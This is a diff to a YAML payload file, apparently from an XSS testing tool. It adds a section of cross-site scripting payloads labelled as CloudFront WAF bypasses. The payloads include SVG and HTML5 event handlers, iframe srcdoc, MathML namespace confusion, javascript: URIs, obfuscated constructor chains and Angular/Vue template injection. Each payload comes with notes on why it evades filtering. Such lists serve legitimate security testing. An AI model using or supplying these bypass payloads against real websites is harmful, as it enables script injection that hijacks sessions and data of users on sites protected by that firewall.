@@ -132,3 +132,133 @@ payloads:
     tags: [waf-bypass, data-uri, base64, object]
     description: Object with base64-encoded data URI
     severity: high
+
+  # ── CloudFront-specific bypasses ─────────────────────────────────────────
+  # CloudFront WAF blocks <script>, <img onerror=>, and many classic patterns.
+  # The entries below use HTML5 event handlers, SVG, and less-common elements
+  # that slip past CloudFront's managed rule groups.
+
+  - text: '<svg/onload=alert(1)>'
+    tags: [waf-bypass, cloudfront, svg, no-space]
+    description: SVG onload without space after tag name — evades space-based pattern matching
+    severity: high
+
+  - text: '<svg onload=alert(1)//>'
+    tags: [waf-bypass, cloudfront, svg, comment-close]
+    description: SVG onload with JS comment before closing angle bracket
+    severity: high
+
+  - text: '<details open ontoggle=alert(1)>'
+    tags: [waf-bypass, cloudfront, html5, details]
+    description: HTML5 details element auto-triggers ontoggle when open attribute present
+    severity: high
+
+  - text: '<details/open/ontoggle=alert(1)>'
+    tags: [waf-bypass, cloudfront, html5, details, no-space]
+    description: Details element using slash separators instead of spaces
+    severity: high
+
+  - text: '<input autofocus onfocus=alert(1)>'
+    tags: [waf-bypass, cloudfront, html5, autofocus]
+    description: Input with autofocus fires onfocus immediately on page load
+    severity: high
+
+  - text: '<input autofocus/onfocus=alert(1)>'
+    tags: [waf-bypass, cloudfront, html5, autofocus, no-space]
+    description: Autofocus input without spaces between attributes
+    severity: high
+
+  - text: '<video><source onerror=alert(1)></video>'
+    tags: [waf-bypass, cloudfront, html5, video]
+    description: Video source onerror fires when src is invalid
+    severity: high
+
+  - text: '<video src=x onerror=alert(1)//>'
+    tags: [waf-bypass, cloudfront, html5, video]
+    description: Video element onerror — avoids img/script keyword matching
+    severity: high
+
+  - text: '<audio src=x onerror=alert(1)>'
+    tags: [waf-bypass, cloudfront, html5, audio]
+    description: Audio element onerror fires on invalid src
+    severity: high
+
+  - text: '<body onpageshow=alert(1)>'
+    tags: [waf-bypass, cloudfront, body, onpageshow]
+    description: Body onpageshow fires on initial load and browser back-navigation
+    severity: high
+
+  - text: '<iframe onload=alert(1) src=about:blank>'
+    tags: [waf-bypass, cloudfront, iframe, onload]
+    description: Iframe onload with about:blank src to avoid URL filtering
+    severity: high
+
+  - text: '<iframe srcdoc="<script>alert(1)</script>">'
+    tags: [waf-bypass, cloudfront, iframe, srcdoc]
+    description: Iframe srcdoc executes inline HTML — content may not be inspected by WAF
+    severity: high
+
+  - text: '<math><mtext></table><img src=x onerror=alert(1)>'
+    tags: [waf-bypass, cloudfront, namespace-confusion, math]
+    description: MathML namespace confusion causes parser to treat subsequent content differently
+    severity: high
+
+  - text: '<xss id=x tabindex=1 onfocusin=alert(1)></xss>#x'
+    tags: [waf-bypass, cloudfront, custom-tag, fragment]
+    description: Custom element with fragment-based focus trigger via URL hash
+    severity: medium
+
+  - text: '<marquee onstart=alert(1)>'
+    tags: [waf-bypass, cloudfront, legacy, marquee]
+    description: Marquee onstart fires when animation begins — legacy but often unfiltered
+    severity: medium
+
+  - text: '<form><button formaction=javascript:alert(1)>X</button></form>'
+    tags: [waf-bypass, cloudfront, formaction, javascript-url]
+    description: Button formaction with javascript: URI executes on click
+    severity: high
+
+  - text: '<isindex action=javascript:alert(1) type=submit>'
+    tags: [waf-bypass, cloudfront, isindex, javascript-url]
+    description: Obsolete isindex element with javascript: action — rarely filtered
+    severity: medium
+
+  - text: "<script>window['ale'+'rt'](1)</script>"
+    tags: [waf-bypass, cloudfront, string-concat, bracket-notation]
+    description: Split alert keyword via bracket notation and string concatenation
+    severity: high
+
+  - text: "<script>(()=>{})['constructor']('alert(1)')()</script>"
+    tags: [waf-bypass, cloudfront, constructor-chain, arrow-func]
+    description: Reach Function constructor via arrow function prototype chain
+    severity: high
+
+  - text: "<script>Object.assign(window,{onload:()=>alert(1)})</script>"
+    tags: [waf-bypass, cloudfront, object-assign, event-assign]
+    description: Assign window.onload via Object.assign to avoid literal function calls
+    severity: high
+
+  - text: '{{constructor.constructor("alert(1)")()}}'
+    tags: [waf-bypass, cloudfront, csti, angular, vue]
+    description: Client-Side Template Injection via constructor chain — targets Angular/Vue
+    severity: high
+
+  - text: '{{7*7}}'
+    tags: [waf-bypass, cloudfront, csti, template-probe]
+    description: Template engine math probe — if response contains 49, CSTI is confirmed
+    severity: medium
+
+  - text: '<svg><animate onbegin=alert(1) attributeName=x dur=1s>'
+    tags: [waf-bypass, cloudfront, svg, animate]
+    description: SVG animate element onbegin fires at animation start
+    severity: high
+
+  - text: '<svg><set onbegin=alert(1) attributeName=x to=y>'
+    tags: [waf-bypass, cloudfront, svg, set-element]
+    description: SVG set element onbegin — less commonly filtered than onload
+    severity: high
+
+  - text: '<svg><use href="data:image/svg+xml,<svg id=x xmlns=http://www.w3.org/2000/svg><script>alert(1)</script></svg>#x">'
+    tags: [waf-bypass, cloudfront, svg, use-href, data-uri]
+    description: SVG use element with data URI reference containing inline script
+    severity: high
